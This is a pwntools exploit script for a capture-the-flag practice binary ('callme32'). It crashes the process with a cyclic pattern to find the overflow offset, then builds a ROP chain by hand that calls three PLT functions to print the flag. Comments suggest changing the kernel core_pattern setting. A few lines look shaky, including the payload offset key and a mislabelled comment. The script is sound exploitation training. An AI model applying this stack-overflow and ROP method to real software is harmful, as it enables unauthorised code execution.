from pwn import *

# You must call the callme_one(), callme_two() and callme_three()
# functions in that order, each with the arguments 0xdeadbeef,
# 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe,
# 0xd00df00d) to print the flag. For the x86_64 binary double up those
# values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe,
# 0xd00df00dd00df00d)

# The solution here is simple enough, use your knowledge about what
# resides in the PLT to call the callme_ functions in the above order
# and with the correct arguments. If you're taking on the MIPS version
# of this challenge, don't forget about the branch delay slot.

# Load binary into pwntools
elf = context.binary = ELF('callme32')

# Enable verbose logging
context.log_level = 'debug'

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of ESP at the time of crashing
stack = core.esp
info("%#x stack", stack)

# Read EIP, which will be some of our cyclic data.
# In previous examples, I used core.eip, but it does also work with core.fault_addr
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.fault_addr
info("%r pattern", pattern)

# print length of the buffer
info("%s bufferlen", cyclic_find(core.fault_addr))

# use pwnlib for crafting the stack
rop = ROP(elf)

# Does not work, but should
# rop.call('callme_one', [p32(0xdeadbeef), p32(0xcafebabe), p32(0xd00df00d)])
# rop.call('callme_two', [p32(0xdeadbeef), p32(0xcafebabe), p32(0xd00df00d)])
# rop.call('callme_three', [p32(0xdeadbeef), p32(0xcafebabe), p32(0xd00df00d)])

# Also does not work, but should
# rop.callme_one(b'deadbeef', b'cafebabe', b'd00df00d')
# rop.callme_two(b'deadbeef', b'cafebabe', b'd00df00d')
# rop.callme_three(b'deadbeef', b'cafebabe', b'd00df00d')

# info(rop.dump())

# We build the rop chain manually

callme_one_plt = elf.symbols.plt.callme_one
callme_two_plt = elf.symbols.plt.callme_two
callme_three_plt = elf.symbols.plt.callme_three

# Find a nice gadget for popping the arguments form the stack
# [0x08048570] > /R pop
# 0x080487f8                 5b  pop ebx
# 0x080487f9                 5e  pop esi
# 0x080487fa                 5f  pop edi
# 0x080487fb                 5d  pop ebp
# 0x080487fc                 c3  ret

# we need to pop only three arguments
# instead of four
popper = p32(0x080487f9)

# craft the payload

rop = b""
# call first function and clear stack
rop += p32(callme_one_plt)
rop += popper
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)
# call second function and clear stack
rop += p32(callme_two_plt)
rop += popper
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)
# call second function and do not care about clean stack
rop += p32(callme_three_plt)
rop += b"BBBB"
rop += p32(0xdeadbeef)
rop += p32(0xcafebabe)
rop += p32(0xd00df00d)

payload = flat({
    pattern: rop
})

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
# io.interactive()
io.wait()

io.recvuntil("callme_two() called correctly\n")

# Get our flag
flag = io.recvline()
print(flag)
